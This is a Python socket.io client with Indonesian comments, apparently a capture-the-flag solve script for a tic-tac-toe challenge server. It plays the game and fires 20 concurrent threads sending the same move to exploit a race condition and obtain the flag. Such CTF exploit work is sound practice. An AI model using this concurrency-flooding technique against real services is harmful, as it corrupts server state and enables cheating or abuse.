import socketio
import threading
import time

# Inisialisasi klien socket.io
sio = socketio.Client()

# ID permainan akan disimpan di sini setelah permainan baru dimulai
game_id = None

# Fungsi untuk menangani koneksi
@sio.event
def connect():
    print("Terhubung ke server")
    # Mengirim event untuk memulai permainan baru
    sio.emit('client_new_game')

# Fungsi untuk menangani permulaan permainan baru dari server
@sio.on('server_new_game')
def on_new_game(data):
    global game_id
    print(f'data dari server_new_game: {data}')
    game_id = data['game_id']
    print(f"Permainan baru dimulai dengan ID: {game_id}")
    print("Menunggu giliran Anda untuk memulai...")

# Fungsi untuk memasukkan langkah pada kotak tertentu
def place_square(square):
    if game_id is not None:
        sio.emit('client_place_square', {'game_id': game_id, 'square': square})
        print(f"Memilih kotak {square}")

# Fungsi untuk memperbarui papan permainan setelah setiap langkah
@sio.on('server_board_update')
def on_board_update(data):
    # Menampilkan status papan
    board = ["X" if x == 0 else "O" if x == 1 else " " for x in data['board']]
    for i in range(0, 9, 3):
        print(f"{board[i]} | {board[i+1]} | {board[i+2]}")
    
    # Mengecek giliran atau hasil permainan
    if data['winner'] == 0:
        print(f"Flag: {data['flag']}")
        print("Anda menang! Mungkin Anda mendapatkan flag.")
    elif data['winner'] == 1:
        print("Anda kalah...")
    elif data['winner'] == 3:
        print("Permainan seri.")
    elif data['turn'] == 0:  # Giliran pemain
        print("Giliran Anda")
        perform_user_moves()  # Meminta input pengguna jika giliran pemain

# Fungsi untuk meminta langkah dari pengguna
def perform_user_moves():
    try:
        # Langkah pertama
        square = int(input("Pilih kotak pertama (0-8): "))
        if square == 2:
            print("Memulai race condition...")
            attempt_race_condition()  # Menggunakan race condition jika pengguna memasukkan 2
            return
        place_square(square)
        time.sleep(1)  # Jeda singkat untuk memberi waktu server memproses langkah pertama

        # Langkah kedua
        square = int(input("Pilih kotak kedua (0-8): "))
        if square == 2:
            print("Memulai race condition...")
            attempt_race_condition()  # Menggunakan race condition jika pengguna memasukkan 2
            return
        place_square(square)
        time.sleep(1)  # Jeda singkat sebelum langkah ketiga

        # Langkah ketiga
        square = int(input("Pilih kotak ketiga atau masukkan '2' untuk memulai race condition: "))
        if square == 2:
            print("Memulai race condition pada langkah ketiga...")
            attempt_race_condition()  # Menggunakan race condition pada langkah ketiga
        else:
            place_square(square)
    except ValueError:
        print("Input tidak valid, harap masukkan angka 0-8.")

# Fungsi untuk melakukan *race condition* pada langkah ketiga
def attempt_race_condition():
    # Memilih kotak yang akan dimanipulasi untuk race condition
    target_square = 2

    # Mengirim beberapa thread ke kotak yang sama untuk memicu race condition
    threads = []
    for i in range(20):  # Meningkatkan jumlah thread untuk meningkatkan peluang race condition
        t = threading.Thread(target=place_square, args=(target_square,))
        threads.append(t)
        t.start()

    # Menunggu semua thread selesai
    for t in threads:
        t.join()

# Fungsi untuk menangani putusnya koneksi
@sio.event
def disconnect():
    print("Terputus dari server")

# Menghubungkan ke server
sio.connect('https://usc-tictactocket.chals.io', wait_timeout=10)

# Tetap aktif hingga permainan selesai
sio.wait()
